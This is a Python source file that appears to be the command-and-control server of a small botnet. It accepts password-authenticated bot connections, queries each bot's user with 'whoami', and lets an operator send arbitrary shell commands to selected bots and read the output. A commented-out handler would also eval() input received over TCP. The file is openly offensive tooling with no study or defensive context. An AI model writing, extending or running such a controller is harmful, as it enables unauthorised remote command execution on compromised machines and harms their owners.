import asyncio
import re
from asyncio.streams import StreamReader, StreamWriter
from typing import List

import click
import names
from aioconsole import ainput
from prettytable import PrettyTable

from utils import hash_sha256, is_num


class Id:
    idx = 1

    @staticmethod
    def next():
        cur = Id.idx
        Id.idx += 1
        return cur


class Bot:
    def __init__(self,
                 idx: int,
                 remote_address: str,
                 reader: StreamReader,
                 writer: StreamWriter):
        self.idx = idx
        self.remote_address = remote_address
        self.reader = reader
        self.writer = writer
        self.name: str = names.get_full_name()
        self.user: str = "--Unknown--"

    async def set_user(self):
        logged_as = await self.send_command("whoami")
        self.user = logged_as.strip("\n") if logged_as else "--Unknown--"

    def __str__(self):
        return f"Bot {self.remote_address} with idx: {self.idx} {self.name} " \
            f"with user {self.user}"

    async def send_command(self, command: str):
        # TODO check if connection is still alive
        self.writer.write(command.encode("utf8"))
        received = ""
        while not received.endswith("DONE\n"):
            received = f'{received}{(await self.reader.read(255)).decode("utf8")}'
        received = received.strip("DONE\n")
        return received


class Context:
    def __init__(self, plain_password):
        self.pass_hash: str = hash_sha256(plain_password)
        self.bots: List[Bot] = []
        self.interrupted = False

    # TODO: allow connection to control center via TCP
    # async def handle_cli_control(self, reader: StreamReader,
    #                              writer: StreamWriter):
    #     request = None
    #     while request != 'quit':
    #         request = (await reader.read(255)).decode('utf8')
    #         response = str(eval(request)) + '\n'
    #         writer.write(response.encode('utf8'))
    #         await writer.drain()
    #     writer.close()

    def get_bot(self, idx):
        try:
            return list(filter(lambda x: x.idx == idx, self.bots))[0]
        except Exception:
            return None

    def log(self, msg: str, pline=False):
        if not self.interrupted:
            self.interrupted = True
            print()

        print(f"\nLOG: {msg}" if pline else f"LOG: {msg}")

    def print_cli_options(self):
        self.interrupted = False
        print("> Enter:")
        print('> "0" - to print bot clients collection')
        print("> Indexes of bot clients separated by space to send bash command")
        print("> ", end="", flush=True)

    async def command_control_cli(self):
        self.print_cli_options()
        while True:
            choice = (await ainput("")).strip("\n")

            if choice == "0":
                self.print_bot_database_summary(updated=False)
                self.print_cli_options()
                continue

            if any(filter(lambda x: not is_num(x), choice.split(" "))):
                print("Unknown input")
                print("> ", end="", flush=True)
                continue

            print("Enter command:\n> ", end="", flush=True)
            command = await ainput("")

            bot_idxs = choice.split(" ")
            for idx in bot_idxs:
                bot = self.get_bot(int(idx))
                if not bot:
                    print(f"Did not find bot with idx {idx}")
                    continue

                print(f"Bot idx {idx}:")
                stdout = await bot.send_command(command)
                print(stdout)

            print("\nDONE\n")
            self.print_cli_options()

    async def handle_bot(self, reader: StreamReader, writer: StreamWriter):
        remote_adr = writer.transport.get_extra_info('peername')[0]
        pass_line = (await reader.readline()).decode('utf8')

        if not self.bot_authenticated(pass_line):
            self.log(f"Client from {remote_adr} has wrong password")
            return

        success, idx = await self.add_bot_client(reader, writer)
        if not success:
            return

    def bot_authenticated(self, pass_line: str):
        re_hash = re.search("^Password: (.*)$", pass_line)
        return len(re_hash.groups()) and re_hash.group(1) == self.pass_hash

    async def add_bot_client(self, reader: StreamReader, writer: StreamWriter):
        idx = Id.next()
        try:
            remote_adr = writer.transport.get_extra_info('peername')[0]
            new_bot = Bot(
                idx,
                remote_adr,
                reader,
                writer
            )
            await new_bot.set_user()

            self.log(f"Adding new bot client from adr {remote_adr}...",pline=True)
            self.bots.append(new_bot)
            self.print_bot_database_summary()
            return True, idx
        except Exception as e:
            self.log(f"Exception {e} during creating new bot client")
            return False, 0
        finally:
            # Return back cli to user
            self.print_cli_options()

    def remove_bot_client(self, idx: int):
        removing_bot = list(filter(lambda x: x.idx == idx, self.bots))[0]
        self.log(f"{removing_bot} is being removed, conn is closed", pline=True)
        self.bots.remove(removing_bot)
        self.print_bot_database_summary()

        # Return back cli to user
        self.print_cli_options()

    def print_bot_database_summary(self, updated=True):
        if updated:
            self.log("Bot clients collection got updated:")
        x = PrettyTable()
        x.field_names = ["Index", "Remote address", "Name", "Logged as"]
        for bot in self.bots:
            x.add_row([bot.idx, bot.remote_address, bot.name, bot.user])
        print(x)
        print()


@click.command()
@click.option(
    "--cac_port",
    "-cp",
    type=click.INT,
    default=6767,
    help="Port where command and control center listens",
)
@click.option(
    "--bot_port",
    "-bp",
    type=click.INT,
    default=6777,
    help="Port where bots should connect in order to join the botnet",
)
@click.option(
    "--secret_password",
    "-s",
    default="pass",
    help="Password needed for bots to connect",
)
@click.option(
    "--ip_address",
    "-i",
    default="0.0.0.0",
    help="Ip address for server to listen on",
)
def main(cac_port: int, bot_port: int, ip_address: str, secret_password: str):
    ctx = Context(secret_password)
    loop = asyncio.get_event_loop()

    # TODO: allow connection to control center via TCP
    # Start tcp server loop taking care of cli control connections
    # loop.create_task(asyncio.start_server(ctx.handle_cli_control,
    #                                       ip_address,
    #                                       cac_port))

    # Start tcp server loop taking care of botnet connections
    loop.create_task(asyncio.start_server(ctx.handle_bot,
                                          ip_address,
                                          bot_port))

    # Start infinite loop to take commands from cli
    loop.create_task(ctx.command_control_cli())

    # TODO: allow connection to control center via TCP
    # print(f"Starting control listener via {ip_address}:{cac_port}")
    print(f"Starting bot client listener via {ip_address}:{bot_port}")
    loop.run_forever()


if __name__ == "__main__":
    main()

